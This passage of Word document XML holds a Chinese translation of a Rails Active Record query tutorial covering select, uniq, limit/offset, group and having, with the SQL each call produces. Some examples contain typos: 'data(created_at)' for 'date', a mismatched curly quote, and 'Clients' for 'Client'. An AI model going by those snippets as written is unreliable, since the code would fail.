      <w:tblGrid>
        <w:gridCol w:w="4631"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="3AF16173" w14:textId="77777777" w:rsidTr="00DE0EFC">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="06245584" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="209222355"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>SELECT</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>viewableby, locked FROM</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>clients</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="593450F7" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>请特别小心，因为你这样只是初始化了一个 model 对象的一些字段。所以当你操作那些你还未初始化的字段时，就会得到一个异常：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8136"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="40BCF756" w14:textId="77777777" w:rsidTr="00DE0EFC">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="47130BEA" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="405029906"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>ActiveModel::MissingAttributeError: missing attribute: &lt;attribute&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2C69643A" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">其中 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>&lt;attribute&gt;</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 是你要操作的属性名。</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>id</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 方法不会抛出 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ActiveRecord::MissingAttributeError</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ，所以在使用 model 的 associations 时要小心，因为它依赖于 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>id</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 方法。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6236D192" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">如果你想对于某个字段只返回不同的记录，你可以使用 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>uniq</w:t>
      </w:r>
      <w:r>
        <w:t>：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3216"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="255CF647" w14:textId="77777777" w:rsidTr="00DE0EFC">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6C12B956" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="255748013"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Client.select(:name).uniq</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7A60DA21" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">它会生成如下 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 语句：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3886"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="58655368" w14:textId="77777777" w:rsidTr="00DE0EFC">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="709D2A1B" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="1890022339"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>SELECT</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>DISTINCT</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>name</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>FROM</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>clients</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="423D9186" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>你也可以移除这个唯一性约束：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4176"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="730D6F39" w14:textId="77777777" w:rsidTr="00DE0EFC">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4F04AC3A" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>query = Client.select(:name).uniq</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="01501227" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; 返回唯一的 name 字段</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="77D516EA" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="44DD0A6A" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>query.uniq(false)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6EE5702D" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; 返回所有 name ，即使有重复</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6570C7BB" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>5 限制和偏移量</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32AB2BAC" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">如果你想在 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Model.find</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 中使用 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>LIMIT</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 来限制结果，那你可以直接在 relation 实例对象上面结合使用 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>limit</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>offset</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 方法来指定 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>LIMIT</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BB73E0C" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">你可以使用 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>limit</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 来指定返回的结果集中记录数量，然后使用 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>offset</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 来指定偏移的记录数目。比如：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2016"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="3DB583FA" w14:textId="77777777" w:rsidTr="00DE0EFC">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6FD44705" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="50160627"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Client.limit(5)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7794DCB7" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">将会最多返回 5 条记录，并且因为没有偏移量，所以它会返回最前面的 5 条记录。它执行的 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 语句如下：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3551"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="68B4D187" w14:textId="77777777" w:rsidTr="00DE0EFC">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="24E462F3" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="941105618"/>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LIMIT 5</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7BD70C4B" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">然后在其基础上增加 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>offset</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3456"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="7FE26031" w14:textId="77777777" w:rsidTr="00DE0EFC">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="03FF9ACD" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="652491329"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Clients.limit(5).offset(30)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2A914112" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">它会返回从第 31 条记录开始的最多 5 条记录。它相当于如下 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 语句：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4751"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="65394F6D" w14:textId="77777777" w:rsidTr="00DE0EFC">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="217A2064" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="367335858"/>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LIMIT 5 OFFSET 30</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="62A90427" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>6 分组</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09113A2B" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">为了在查找记录的 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 语句中时指定 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>GROUP BY</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ，你可以直接使用 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>group</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 方法。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74F1299B" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>比如你想找一组记录并按照创建的时间排序：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8522"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="4C0AD055" w14:textId="77777777" w:rsidTr="00DE0EFC">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="62D62308" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="1332097946"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Order.select("data(created_at) as ordered_date, sum(price) as total_price").group("date(created_at)“)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="55E73255" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">它会为每个有 orders 的日期的返回一个 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Order</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 对象。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2182BE79" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">他将会生成如下一样的 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 语句：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8522"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="22CD4CA0" w14:textId="77777777" w:rsidTr="00DE0EFC">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2FD1E866" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="142742267"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>SELECT</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>date(created_at) as</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>ordered_date, sum(price) as</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>total_price FROM</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>orders GROUP</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>BY</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>date(created_at)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3901591D" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>7 Having 语句</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03C46FDA" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 使用者利用 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>HAVING</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 来指定 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>GROUP BY</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 字段的需要满足的条件。你可以在 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Model.find</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 中将 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:having</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 作为一个参数传递给查找方法。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2203A828" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>比如说：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8522"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="7B4C80CE" w14:textId="77777777" w:rsidTr="00DE0EFC">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0156D596" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="2048674106"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Order.select("date(created_at) as ordered_date, sum(price) as total_price").group("date(created_at)").having("sum(price) &gt; ?", 100)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="40F64A36" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">他将会生成如下 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 语句：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
